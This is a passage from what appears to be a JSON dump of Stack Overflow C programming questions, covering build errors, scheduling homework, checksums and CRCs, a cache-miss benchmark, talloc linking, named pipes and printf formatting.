-Incurses -O0 -g3 -Wall -c -fmessage-length=0 -MMD -MP -MF\"source/Curses_01.d\"     -MT\"source/Curses_01.d\" -o\"source/Curses_01.o\" \"../source/Curses_01.c\"\nFinished building: ../source/Curses_01.c\n\nBuilding target: Curses_01\nInvoking: GCC C Linker\ngcc  -o\"Curses_01\"  ./source/Curses_01.o   -lcurses\nFinished building target: Curses_01\n</code></pre>\n\n<p>Thanks everybody in advance!</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":13196349,"title":"How to Implement FCFS using system timer","body":"<p><strong>Question</strong> </p>\n\n<blockquote>\n  <p>Write the programs to implement the below given CPU scheduling\n  algorithms.\n  1. FCFS\n  2. RR Take the inputs, Process name, Arrival time of the process, CPU execution time of the process. For implementing RR additional input,\n  the desired time quantum should be taken from the user. Use system\n  timer to check the time quantum and display after every second the\n  process running on the CPU or if the CPU is idle until all the\n  inputted processes complete their execution. Calculate waiting time,\n  turn around time for each process. Suggest best scheduling algorithm\n  for the given inputs.</p>\n</blockquote>\n\n<p>How do I implement FCFS using system timer in C?</p>\n\n<pre><code>int wtm,tatm,ft,itm; //waiting time turn Aroundtime finish time ideal time\nwtm=0;\ntatm=0;\nft=prs[0].at;\nprintf(\"\\n\\t******FCFS SCHEDULING******\\n\");\nprintf(\"Process No\\tProcess Name\\tArrival Time\\tExecution Time\\tWaitingTime\\tTurnAroundTime\\n\");\nprintf(\"----------\\t------------\\t------------\\t--------------\\t-----------\\t--------------\\n\");\nfor(j=0;j&lt;np;j++)\n{\n    itm=0;\n    wtm=ft-prs[j].at;\n\n    if(wtm&lt;0)\n    {\n        itm=(-1)*wtm;\n        wtm=0;\n    } \n\n    ft=ft+prs[j].xt+itm;\n    tatm=ft-prs[j].at;\n    printf(\"%8d %15s %15d %15d %15d %15d\\n\",j+1,prs[j].name,prs[j].at,prs[j].xt,wtm,tatm);\n}\n</code></pre>\n\n<p>This code is working and I've modified with ideal time. Main thing is I want the execution to happen in real time, meaning when the process starts it should use the systems timer util it is busy.</p>\n"},{"tags":["android","c++","c","android-ndk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":13176640,"title":"Errors on NDK build","body":"<p>I'm trying to build a wraper using some old C++ code in Android.</p>\n\n<p>When compiling the errors bellow are shown:</p>\n\n<pre><code>In file included from /usr/local/android/android-ndk-r8b/sources/cxx-stl/gnu-libstdc++/4.6/include/bits/stl_algobase.h:61:0,\n                 from /usr/local/android/android-ndk-r8b/sources/cxx-stl/gnu-libstdc++/4.6/include/bits/stl_tree.h:63,\n                 from /usr/local/android/android-ndk-r8b/sources/cxx-stl/gnu-libstdc++/4.6/include/map:60,\n                 from /home/vocalize/source/xxxxxxxxxxxxxxxxxxxxx/Lxxxxxxx.h:9,\n                 from /home/vocalize/source/xxxxxxxxxxxxxxxxx/jni/cxxx_wrap.c:3:\n/usr/local/android/android-ndk-r8b/sources/cxx-stl/gnu-libstdc++/4.6/include/bits/functexcept.h:43:1: error: unknown type name 'namespace'\n/usr/local/android/android-ndk-r8b/sources/cxx-stl/gnu-libstdc++/4.6/include/bits/functexcept.h:44:1: error: expected ',' or ';' before '{' token\n</code></pre>\n\n<p>I'm using the following Makefile.mk</p>\n\n<pre><code>include $(CLEAR_VARS)\nLOCAL_C_INCLUDES := $(MY_LIB_DIR)include\n\nLOCAL_CFLAGS += -DHAVE_CONFIG_H\nLOCAL_CFLAGS += -DANDROID_NDK\n\nLOCAL_PATH := $(BASE_PATH)\nLOCAL_MODULE := cxxxx_lib\n\nLOCAL_SRC_FILES := cxxxx_wrap.c\n\nLOCAL_STATIC_LIBRARIES := my_lib\nLOCAL_LDLIBS := -llog \n\ninclude $(BUILD_SHARED_LIBRARY) \n</code></pre>\n\n<p>What I can do to fix these errors?</p>\n"},{"tags":["c","udp","hex","packet","bit"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":148,"score":1,"question_id":10899881,"title":"C Programming - Bitwise operators and knowing when to utilize","body":"<p>I have read in the K&amp;R II C Programming ANSI C book that the \">>\" and \"&lt;&lt;\" operators control bits, and of course with me being a noob, I don't understand when to use them. I got interested in figuring out how to build packets manually and I came across the following snippet:</p>\n\n<pre><code>unsigned short csum(unsigned short *buf, int nwords)\n{       \n        unsigned long sum;\n        for(sum=0; nwords&gt;0; nwords--)\n                sum += *buf++;\n        sum = (sum &gt;&gt; 16) + (sum &amp;0xffff);\n        sum += (sum &gt;&gt; 16);\n        return (unsigned short)(~sum);\n}\n</code></pre>\n\n<p>I know that this calculates the checksum, but I don't understand what is going on here. XD</p>\n\n<p>Obviously this is out of my skill range, but I figured I can use this snippet as a scapegoat to figure out some unanswered questions. <em>When</em> do you know when to use the bitwise operators to achieve a certain value, why not just add (+) or subtract (-)? Also, why is there a hexadecimal <code>&amp;0xffff</code> there next to <code>sum</code>, if there are no operators with the two?</p>\n\n<p>P.S. What does <code>~sum</code> mean?</p>\n"},{"tags":["c++","c","caching","memory","hardware"],"answer_count":1,"favorite_count":2,"up_vote_count":11,"down_vote_count":2,"view_count":174,"score":9,"question_id":13193569,"title":"Cache miss stress test: stunning results.. any explanations?","body":"<p>In order to get the actual performance of a modern computer relatively to cache misses (how 'spread' is the data in memory), I conducted a simple test where I allocate 500 MB of RAM, and then perform a constant number of reads, and I perform that test with increasing byte offsets. Finally, I wrap over the end of the 1000 MB buffer when I reach it.</p>\n\n<p>I'm quite surprised by the results. It looks like there is a cost barrier around 32 bytes, and another one around 32 KB. I guess this has something to do with L1/L2/L3 cache loads, or virtual memory page size? What stunned me the most is that there seems to be only about 16 completely different memory locations that are being cached. That's very low!!! Any explanations (OS, hardware)?</p>\n\n<p>Here are the results on 3 different computers, from the fastest one to the cheapest one, followed by my simple test code (uses only standard libs). </p>\n\n<p>16 GB RAM fast HP workstation (test in 32 bits Windows):</p>\n\n<pre><code>time=0.364000 byteIncrement=4 numReadLocations=262144000 numReads=262144000\ntime=0.231000 byteIncrement=8 numReadLocations=131072000 numReads=262144000\ntime=0.339000 byteIncrement=16 numReadLocations=65536000 numReads=262144000\ntime=0.567000 byteIncrement=32 numReadLocations=32768000 numReads=262144000\ntime=1.177000 byteIncrement=64 numReadLocations=16384000 numReads=262144000\ntime=1.806000 byteIncrement=128 numReadLocations=8192000 numReads=262144000\ntime=2.293000 byteIncrement=256 numReadLocations=4096000 numReads=262144000\ntime=2.464000 byteIncrement=512 numReadLocations=2048000 numReads=262144000\ntime=2.621000 byteIncrement=1024 numReadLocations=1024000 numReads=262144000\ntime=2.775000 byteIncrement=2048 numReadLocations=512000 numReads=262144000\ntime=2.908000 byteIncrement=4096 numReadLocations=256000 numReads=262144000\ntime=3.007000 byteIncrement=8192 numReadLocations=128000 numReads=262144000\ntime=3.183000 byteIncrement=16384 numReadLocations=64000 numReads=262144000\ntime=3.758000 byteIncrement=32768 numReadLocations=32000 numReads=262144000\ntime=4.287000 byteIncrement=65536 numReadLocations=16000 numReads=262144000\ntime=6.366000 byteIncrement=131072 numReadLocations=8000 numReads=262144000\ntime=6.124000 byteIncrement=262144 numReadLocations=4000 numReads=262144000\ntime=5.295000 byteIncrement=524288 numReadLocations=2000 numReads=262144000\ntime=5.540000 byteIncrement=1048576 numReadLocations=1000 numReads=262144000\ntime=5.844000 byteIncrement=2097152 numReadLocations=500 numReads=262144000\ntime=5.785000 byteIncrement=4194304 numReadLocations=250 numReads=262144000\ntime=5.714000 byteIncrement=8388608 numReadLocations=125 numReads=262144000\ntime=5.825000 byteIncrement=16777216 numReadLocations=62 numReads=262144000\ntime=5.759000 byteIncrement=33554432 numReadLocations=31 numReads=262144000\ntime=2.222000 byteIncrement=67108864 numReadLocations=15 numReads=262144000\ntime=0.471000 byteIncrement=134217728 numReadLocations=7 numReads=262144000\ntime=0.377000 byteIncrement=268435456 numReadLocations=3 numReads=262144000\ntime=0.166000 byteIncrement=536870912 numReadLocations=1 numReads=262144000\n</code></pre>\n\n<p>4 GB RAM MacBookPro 2010 (test in 32 bits Windows):</p>\n\n<pre><code>time=0.476000 byteIncrement=4 numReadLocations=262144000 numReads=262144000\ntime=0.357000 byteIncrement=8 numReadLocations=131072000 numReads=262144000\ntime=0.634000 byteIncrement=16 numReadLocations=65536000 numReads=262144000\ntime=1.173000 byteIncrement=32 numReadLocations=32768000 numReads=262144000\ntime=2.360000 byteIncrement=64 numReadLocations=16384000 numReads=262144000\ntime=3.469000 byteIncrement=128 numReadLocations=8192000 numReads=262144000\ntime=3.990000 byteIncrement=256 numReadLocations=4096000 numReads=262144000\ntime=3.549000 byteIncrement=512 numReadLocations=2048000 numReads=262144000\ntime=3.758000 byteIncrement=1024 numReadLocations=1024000 numReads=262144000\ntime=3.867000 byteIncrement=2048 numReadLocations=512000 numReads=262144000\ntime=4.275000 byteIncrement=4096 numReadLocations=256000 numReads=262144000\ntime=4.310000 byteIncrement=8192 numReadLocations=128000 numReads=262144000\ntime=4.584000 byteIncrement=16384 numReadLocations=64000 numReads=262144000\ntime=5.144000 byteIncrement=32768 numReadLocations=32000 numReads=262144000\ntime=6.100000 byteIncrement=65536 numReadLocations=16000 numReads=262144000\ntime=8.111000 byteIncrement=131072 numReadLocations=8000 numReads=262144000\ntime=6.256000 byteIncrement=262144 numReadLocations=4000 numReads=262144000\ntime=6.311000 byteIncrement=524288 numReadLocations=2000 numReads=262144000\ntime=6.416000 byteIncrement=1048576 numReadLocations=1000 numReads=262144000\ntime=6.635000 byteIncrement=2097152 numReadLocations=500 numReads=262144000\ntime=6.530000 byteIncrement=4194304 numReadLocations=250 numReads=262144000\ntime=6.544000 byteIncrement=8388608 numReadLocations=125 numReads=262144000\ntime=6.545000 byteIncrement=16777216 numReadLocations=62 numReads=262144000\ntime=5.272000 byteIncrement=33554432 numReadLocations=31 numReads=262144000\ntime=1.524000 byteIncrement=67108864 numReadLocations=15 numReads=262144000\ntime=0.538000 byteIncrement=134217728 numReadLocations=7 numReads=262144000\ntime=0.508000 byteIncrement=268435456 numReadLocations=3 numReads=262144000\ntime=0.817000 byteIncrement=536870912 numReadLocations=1 numReads=262144000\n</code></pre>\n\n<p>4GB RAM cheap Acer \"family computer\":</p>\n\n<pre><code>time=0.732000 byteIncrement=4 numReadLocations=262144000 numReads=262144000\ntime=0.549000 byteIncrement=8 numReadLocations=131072000 numReads=262144000\ntime=0.765000 byteIncrement=16 numReadLocations=65536000 numReads=262144000\ntime=1.196000 byteIncrement=32 numReadLocations=32768000 numReads=262144000\ntime=2.318000 byteIncrement=64 numReadLocations=16384000 numReads=262144000\ntime=2.483000 byteIncrement=128 numReadLocations=8192000 numReads=262144000\ntime=2.760000 byteIncrement=256 numReadLocations=4096000 numReads=262144000\ntime=3.194000 byteIncrement=512 numReadLocations=2048000 numReads=262144000\ntime=3.369000 byteIncrement=1024 numReadLocations=1024000 numReads=262144000\ntime=3.720000 byteIncrement=2048 numReadLocations=512000 numReads=262144000\ntime=4.842000 byteIncrement=4096 numReadLocations=256000 numReads=262144000\ntime=5.797000 byteIncrement=8192 numReadLocations=128000 numReads=262144000\ntime=9.865000 byteIncrement=16384 numReadLocations=64000 numReads=262144000\ntime=19.273000 byteIncrement=32768 numReadLocations=32000 numReads=262144000\ntime=19.282000 byteIncrement=65536 numReadLocations=16000 numReads=262144000\ntime=19.606000 byteIncrement=131072 numReadLocations=8000 numReads=262144000\ntime=20.242000 byteIncrement=262144 numReadLocations=4000 numReads=262144000\ntime=20.956000 byteIncrement=524288 numReadLocations=2000 numReads=262144000\ntime=22.627000 byteIncrement=1048576 numReadLocations=1000 numReads=262144000\ntime=24.336000 byteIncrement=2097152 numReadLocations=500 numReads=262144000\ntime=24.403000 byteIncrement=4194304 numReadLocations=250 numReads=262144000\ntime=23.060000 byteIncrement=8388608 numReadLocations=125 numReads=262144000\ntime=20.553000 byteIncrement=16777216 numReadLocations=62 numReads=262144000\ntime=14.460000 byteIncrement=33554432 numReadLocations=31 numReads=262144000\ntime=1.752000 byteIncrement=67108864 numReadLocations=15 numReads=262144000\ntime=0.963000 byteIncrement=134217728 numReadLocations=7 numReads=262144000\ntime=0.687000 byteIncrement=268435456 numReadLocations=3 numReads=262144000\ntime=0.453000 byteIncrement=536870912 numReadLocations=1 numReads=262144000\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\n#define MEMBLOCSIZE ((2&lt;&lt;20)*500)//1000MB\n\nint readMemory( int* data, int* dataEnd, int numReads, int incrementPerRead ) {\n  int accum = 0;\n  int* ptr = data;\n\n  while(true) {\n    accum += *ptr;\n    if( numReads-- == 0)\n      return accum;\n\n    ptr += incrementPerRead;\n\n    if( ptr &gt;= dataEnd )\n      ptr = data;\n  }\n}\n\nint main()\n{\n  int* data = (int*)malloc(MEMBLOCSIZE);\n  int* dataEnd = data+(MEMBLOCSIZE / sizeof(int));\n\n  int numReads = (MEMBLOCSIZE / sizeof(int));\n  int dummyTotal = 0;\n  int increment = 1;\n  for( int loop = 0; loop &lt; 28; ++loop ) {\n    int startTime = clock();\n\n    dummyTotal += readMemory(data, dataEnd, numReads, increment);\n\n    int endTime = clock();\n    double deltaTime = double(endTime-startTime)/double(CLOCKS_PER_SEC);\n\n    printf(\"time=%f byteIncrement=%d numReadLocations=%d numReads=%d\\n\",\n      deltaTime, increment*sizeof(int), MEMBLOCSIZE/(increment*sizeof(int)), numReads);\n\n    increment *= 2;\n  }\n  //Use dummyTotal: make sure the optimizer is not removing my code...\n  return dummyTotal == 666 ? 1: 0;\n}\n</code></pre>\n\n<p>Based on some comments I modified my test to use only 250 MB of RAM, and to do 16 consecutive reads for each 'read' in case it activates the prefetching. It still has similar results, however it is the case that the last tests, the ones reading few distant locations, have a better performance (2 seconds instead of 5), so it is probably because prefetching was not activated with the initial test.</p>\n\n<pre><code>#define MEMBLOCSIZE 262144000//250MB\n\nint readMemory( int* data, int* dataEnd, int numReads, int incrementPerRead ) {\n  int accum = 0;\n  int* ptr = data;\n\n  while(true) {\n    accum += *ptr;\n    if( numReads-- == 0)\n      return accum;\n\n    //Do 16 consecutive reads\n    for( int i = 1; i &lt; 17; ++i )\n      accum += *(ptr+i);\n\n    ptr += incrementPerRead;\n\n    if( ptr &gt;= dataEnd+17 )\n      ptr = data;\n  }\n}\n</code></pre>\n\n<p>Results for this updated test for MacBookPro 2010:</p>\n\n<pre><code>time=0.691000 byteIncrement=4 numReadLocations=65536000 numReads=65536000\ntime=0.620000 byteIncrement=8 numReadLocations=32768000 numReads=65536000\ntime=0.715000 byteIncrement=16 numReadLocations=16384000 numReads=65536000\ntime=0.827000 byteIncrement=32 numReadLocations=8192000 numReads=65536000\ntime=0.917000 byteIncrement=64 numReadLocations=4096000 numReads=65536000\ntime=1.440000 byteIncrement=128 numReadLocations=2048000 numReads=65536000\ntime=2.646000 byteIncrement=256 numReadLocations=1024000 numReads=65536000\ntime=3.720000 byteIncrement=512 numReadLocations=512000 numReads=65536000\ntime=3.854000 byteIncrement=1024 numReadLocations=256000 numReads=65536000\ntime=4.673000 byteIncrement=2048 numReadLocations=128000 numReads=65536000\ntime=4.729000 byteIncrement=4096 numReadLocations=64000 numReads=65536000\ntime=4.784000 byteIncrement=8192 numReadLocations=32000 numReads=65536000\ntime=5.021000 byteIncrement=16384 numReadLocations=16000 numReads=65536000\ntime=5.022000 byteIncrement=32768 numReadLocations=8000 numReads=65536000\ntime=4.871000 byteIncrement=65536 numReadLocations=4000 numReads=65536000\ntime=5.163000 byteIncrement=131072 numReadLocations=2000 numReads=65536000\ntime=5.276000 byteIncrement=262144 numReadLocations=1000 numReads=65536000\ntime=4.699000 byteIncrement=524288 numReadLocations=500 numReads=65536000\ntime=1.997000 byteIncrement=1048576 numReadLocations=250 numReads=65536000\ntime=2.118000 byteIncrement=2097152 numReadLocations=125 numReads=65536000\ntime=2.071000 byteIncrement=4194304 numReadLocations=62 numReads=65536000\ntime=2.036000 byteIncrement=8388608 numReadLocations=31 numReads=65536000\ntime=1.923000 byteIncrement=16777216 numReadLocations=15 numReads=65536000\ntime=1.084000 byteIncrement=33554432 numReadLocations=7 numReads=65536000\ntime=0.607000 byteIncrement=67108864 numReadLocations=3 numReads=65536000\ntime=0.622000 byteIncrement=134217728 numReadLocations=1 numReads=65536000\n</code></pre>\n"},{"tags":["c","crc"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":601,"score":-2,"question_id":8203342,"title":"How to implement a 16 bit CRC check in C?","body":"<p>I was wondering if anyone could point me in the right direction of how to calculate an 16 bit crc in C. I'm no programming wizard so I'm having a hard time finding source code that is easy to read and implement.</p>\n\n<p>Here is the polynomial: x^16 + x^10 + x^8 + x^7 + x^3 + 1</p>\n\n<p>Here is what the program must do</p>\n\n<p>•   A function for converting hexadecimal string into binary string (I can do this)</p>\n\n<p>•   A function for converting binary to hexadecimal (and this)</p>\n\n<p>•   A function to validate the input (this too)</p>\n\n<p>•   <strong>An XOR function that takes as input two binary strings and returns the XOR result.</strong></p>\n\n<p>•   <strong>A function for CRC calculation</strong> </p>\n\n<p>•   <strong>A function for CRC verification</strong></p>\n\n<p>The last three options I have no idea how to write up. Any help on the subject?</p>\n"},{"tags":["c++","c","visual-studio-2010","visual-studio"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13191394,"title":"Using sub projects in Visual Studio","body":"<p>I am quite used to Linux development and Makefiles, and started using (Windows and) Visual Studio not so long ago.</p>\n\n<p>What I want to do is (I think) quite simple, but I can't seem to find how to do it using Visual Studio.</p>\n\n<p>I have to write an application, which I can divide into several independent sub-parts. I want to work incrementally, and create several projects that together with a main file will end up with my full project. </p>\n\n<p>What I basically want is to be able to write a small project, have a main for it so that I can fully test it, and use it as a dependency for the next project. In this case, the smaller main would be deactivated (or I can comment it), and I would just change the startup project. \nIf I find a bug in a subset while writing my bigger software, I could just change the startup project and solve it at a smaller scale. </p>\n\n<p>Well, that's what I do all day long in Python and Java. </p>\n\n<p>I tried to create new projects into my project, but I always end up having linking problems, where my main projects knows about the files in the sub projects, but not the smaller ones, etc. . . </p>\n\n<p>So, is there a guide somewhere I can find to work this way ? </p>\n\n<p>Thank you</p>\n"},{"tags":["c","memory","compiler-errors"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13195838,"title":"Compile error when use talloc","body":"<p>I write the code below to test the talloc:</p>\n\n<pre><code>#include \"talloc.h\"\n\ntypedef struct linklist\n{\n    char* str;\n    struct linklist* next;\n}LinkList;\n\nint main(int argc,char* argv[])\n{\n    LinkList* lptr=talloc(NULL,LinkList);\n    lptr-&gt;str=talloc_strdup(lptr,\"Test ptr\");\n\n    talloc_free(lptr);\n\n    return 0;\n}\n</code></pre>\n\n<p>But got <strong>compile error</strong>:</p>\n\n<pre><code>talloctest.c:(.text+0x21): undefined reference to `talloc_named_const(void const*, unsigned int, char const*)'\ntalloctest.c:(.text+0x39): undefined reference to `talloc_strdup(void const*, char const*)'\ntalloctest.c:(.text+0x4d): undefined reference to `talloc_free(void*)'\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>Then I find the definition of relative marcos and fuctions:\nDefinition in \"talloc.h\":</p>\n\n<pre><code>#define talloc(ctx, type) (type *)talloc_named_const(ctx, sizeof(type), #type)\nchar *talloc_strdup(const void *t, const char *p);\n</code></pre>\n\n<p>Implemetation in \"talloc.c\":</p>\n\n<pre><code>void *talloc_named_const(const void *context, size_t size, const char *name)\n{\n    return _talloc_named_const(context, size, name);\n}\n\nchar *talloc_strdup(const void *t, const char *p)\n{\n    if (unlikely(!p)) return NULL;\n    return __talloc_strlendup(t, p, strlen(p));\n}\n</code></pre>\n\n<p>Can someone tell me why?I have tried both talloc-1.3.0 and talloc-2.0.7,but got the same result.</p>\n"},{"tags":["c","eclipse","image-processing","opencv","eclipse-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13193149,"title":"How to install OpenCV on Eclipse?","body":"<p>I've downloaded OpenCV, and I have tried to \"connect it with Eclipse\" without success, if anyone knows how it works please help me.<br>\nThanks in advance. </p>\n"},{"tags":["c","multidimensional-array"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":90,"score":2,"question_id":13176801,"title":"C - 2D Array - Magic Square order 4","body":"<pre><code>114 void fillDoubly(int square[20][20], int n){\n115\n116     int i, j, k=0, l=0, counter=0, test[400]={0}, diff=n/4-1;\n117\n118     for(i=0;i&lt;n;i++) //first nested for loops for part 1)\n119         for(j=0;j&lt;n;j++){\n120             counter++;\n121             if( i=j || j=(n-1-i) ){\n122                 {\n123                     square[i][j] = counter;\n124                     test[counter-1] = 1;\n125                 }\n126             }\n127         }\n128\n129     for(i=n-1;i&gt;=0;i--) // for part 2)\n130         for(j=n-1;j&gt;=0;j--){\n131             if(square[i][j]==0){\n132                 while(test[k]!=0){\n133                     k++;\n134                 }\n135                 test[k]=1;\n136                 square[i][j]=k+1;\n137             }\n138         }\n139 }\n</code></pre>\n\n<p>So basically, I have to generate magic square's of order 4\ni.e. the rows and columns are divisible by 4.</p>\n\n<p>I was provided the algorithm which is</p>\n\n<ol>\n<li>to traverse the array and fill in the diagonal subsets</li>\n<li>to traverse the array backwards and fill in the rest</li>\n</ol>\n\n<p>I've done the 4x4 array with the above code and this extends to 8x8,12x12 etc.\nbut I'm <strong>stuck at part 1)</strong> which is to <strong>fill in the diagonal subsets</strong>(e.g. split 8x8 into 4x4 and take that diagonal instead)...I'm not sure how to do that, only managed to fill in the diagonal itself</p>\n\n<pre><code>if( i=j || j=(n-1-i) ){\n</code></pre>\n\n<p>tldr, The above is the condition I use to know if it's diagonal, any suggestions how I can <strong>change the condition to know if it's the diagonal subset</strong> not diagonal?</p>\n\n<p>Thanks</p>\n"},{"tags":["c","colors","clock"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":68,"score":3,"question_id":13193815,"title":"Clock in C: Time light up","body":"<p>For school I have to do a assignment, Im busy with it for like 3 weeks now and still havn't gotten far. We need to make a clock that has to be round and the colours of the seconds minutes AND hours need to light up. So if it's 4:25 am those numbers need to light up.</p>\n\n<p>This is what I've got right now:</p>\n\n<pre><code>   #include &lt;stdio.h&gt;\n   #include &lt;time.h&gt;\n   #include &lt;conio.h&gt;\n   #include &lt;unistd.h&gt;\n   #include &lt;stdlib.h&gt;\n   #include &lt;windows.h&gt;\n\n    int csecs (int cseconds );\n\n    void main (int sec, int min){\n    printf(\"Hallo! Veel plezier met het bekijken van de tijd!\");\n    getch();\n        while (sec)\n            {\n            time_t cseconds;\n            cseconds = time (NULL);\n            printf (\"De Tijd: \");\n            printf (\"%d:\", csecs( cseconds )/60/60%24+1);\n            printf (\"%d:\", csecs( cseconds )/60%60 );\n            printf (\"%d\", csecs( cseconds )%60 );\n\n            Sleep(1000);\n            system(\"cls\");\n        }\n\n    }\n\n    int csecs (int cseconds)\n    {\n        return cseconds;\n\n    }\n</code></pre>\n\n<p>Can anyone tell me how I could possibly do this? I'm not asking you to do my homework.. I just really need some help. </p>\n"},{"tags":["c","pointers"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":13148643,"title":"How to find a char pointer, in a 2-d char array in C?","body":"<p>Hi so Im fairly new to C.</p>\n\n<p>Basically what I am asking is this:</p>\n\n<p>So I have a 2-D <code>char</code> array, that is representing a list of strings (<code>char array[size][20]</code>).</p>\n\n<p>I then have another string, which I am representing as a <code>char</code> pointed (<code>char *word</code>).</p>\n\n<p>What I want my function to do, is to go through each of the strings in my array, and if it finds the word to <code>return 1</code>.</p>\n\n<p>However Im quite confused about pointers, so I'm not sure how to write this. I started with just using a for loop, going through the lines of the array. And then <code>if(word = array[i]) return 1</code>. But this doesn't work for me.</p>\n\n<p>I hope this made sense, if not I will try explain again. And I'll greatly appreciate any answers. I dont really need code. Just a step in the right direction.</p>\n"},{"tags":["c","gcc","cuda","nvcc"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13167598,"title":"error: cuda_runtime.h: No such file or directory","body":"<p>How can I force gcc to look in /usr/cuda/local/include for cuda_runtime.h?</p>\n\n<p>I'm attempting to compile a CUDA application with a C wrapper. I'm running Ubuntu 10.04.</p>\n\n<p>I've successfully compiled my CUDA application into a .so with the following command:</p>\n\n<pre><code>nvcc -arch=sm_11 -o libtest.so --shared -Xcompiler -fPIC main.cu\n</code></pre>\n\n<p>When I try and compile my c wrapper file with the following command:</p>\n\n<pre><code>gcc -std=c99 -o main -L. -ltest main.c\n</code></pre>\n\n<p>I receive the error:</p>\n\n<pre><code>error: cuda_runtime.h: No such file or directory\n</code></pre>\n\n<p>I've verified that cuda_runtime.h is in fact present in /usr/local/cuda/include</p>\n"},{"tags":["c","sorting","fork","pipes","named-pipes"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":37,"score":3,"question_id":13182566,"title":"Need help creating and unknown amount of named pipes to split and sort data","body":"<p>Okay, so I am an assignment that I am completely stuck on regarding pipes. The goal was to take in a \"depth\" \"filename\" and \"attribute\" from the command line. The file is a txt file which holds user information, the attribute is simply which information we want to  later sort by. The depth, however, is important because I need to create a binary tree, using forks, based on the number the user enters. With a depth of 1 I would have my main process, one internal node, and 2 leaf nodes. With a depth of two I would have my main process, one internal node that has two internal nodes as children, and they each have two leaf nodes as children... and so on.  </p>\n\n<p>My code currently reads in all of the information into an array of structs, creates the binary tree of the correct amount of nodes, and all of my sorting algorithms (Shell, Quick, Bubble) work. </p>\n\n<p>Now, I must implement named- pipes and pass the data down to the leaf nodes for sorting. Each internal node is supposed to split the data down to it's children. Then, once the data reaches the leaf nodes they will implement a different sorting algorithm and return the results to their parent/internal. The internal nodes will take the sorted data from it's two children and merge the results. Eventually, the data will be merged all the way back to the anchor node. </p>\n\n<p>My problem is that I cannot wrap my mind around pipes at all. I do not know how to keep track of them or initialize them at the right time. I thought about finding out how many leaf nodes should be produced by the depth given and splitting the data evenly that way, then just making an if statement to run the correct sorter on each part of the data, but that would not be solving the correct problem. Can anyone at all help me implement this, or at least something to start with?</p>\n\n<p>the creation of the tree looks like this</p>\n\n<pre><code>void forkTree(int size){\nif(size == 0){\n    return;\n}\nint left = fork();\nif(left != 0){\n    int right = fork();\n        if(right == 0){\n            sleep(1);\n            forkTree(size-1);\n        }\n}\nelse{\n    sleep(1);\n    forkTree(size-1);\n}\n</code></pre>\n\n<p>and it is invoked like this</p>\n\n<pre><code>if(depth&gt;0){\n//initial fork\nint anchor = fork();\n//make binary tree only in child process\nif(anchor==0){\n    forkTree(depth);\n}\n</code></pre>\n"},{"tags":["c","string"],"answer_count":6,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":5665,"score":8,"question_id":3408706,"title":"Hex String to Byte Array in C","body":"<p>Is there a standard C function that can convert from hex string to bye array? I do not want to write my own function if there is an already existing standard way.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13192642,"title":"how to pass a queue to another function in c","body":"<p>I am trying to pass a queue to another function in c in order to make some operations on it, I've tried to send it's reference and put in a pointer in the function arguments but that doesn't make sense!</p>\n\n<p>here's what I did:</p>\n\n<p>this is the caller:</p>\n\n<pre><code>G = my_job(&amp;qu, inducing_cell, target_cell, G, vertices_number, cells_number);\n</code></pre>\n\n<p>this is the function:</p>\n\n<pre><code>graph* my_job(Queue *qu, Position inducing_cell, Position target_cell, graph* G, unsigned long vertices_number, unsigned long cells_number) {}\n</code></pre>\n"},{"tags":["c","data","printf","project-euler","long-integer"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":46,"score":3,"question_id":13194067,"title":"trouble with printf conversion long long","body":"<p>Hi ive been working on a project euler problem, which by their very nature coerce you to use data types with big storage.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\n#define num 600851475143\n\nint main()\n{\nlong long i, j, count=0, number=num, k;\nfor(i=2;number!=1;i++)\n{\n    count=0;\n    for(j=1;j&lt;=i;j++)\n    {\n        if((i%j)==0)\n        {\n            count++;\n        }\n    }\n    for(k=0;k&lt;100000000;k++)\n    {}\n    if(count==2)\n    {\n        printf(\"                      %d\\n\", i);\n        if(number%i==0)\n        {\n            number/=i;\n            printf(\"      %d\\n\", number);\n            printf(\"%d\\n\", i);\n            i=2;\n        }\n    }\n}\ngetch();\nreturn 0;\n}\n</code></pre>\n\n<p>When i compile and run the program, there is nothing printed for number. I have tried various printf conversions %ll, %l, i have changed data types. I am using GNU GCC compiler. What should i do?</p>\n"},{"tags":["c","linux"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":10202,"score":2,"question_id":5929419,"title":"How to get file creation date in linux?","body":"<p>I am working with batches of files that contain information about the same object at the different times of its life, and the only way to order them is by creation date.\nI was using this:</p>\n\n<pre><code>//char* buffer has the name of file\nstruct stat buf;\nFILE *tf;\ntf = fopen(buffer,\"r\");\n//check handle\nfstat(tf, &amp;buf);\nfclose(tf);\npMyObj-&gt;lastchanged=buf.st_mtime;\n</code></pre>\n\n<p>But that does not seems to work.\nWhat am i doing wrong? Are there other, more reliable/simple ways to get file creation date under 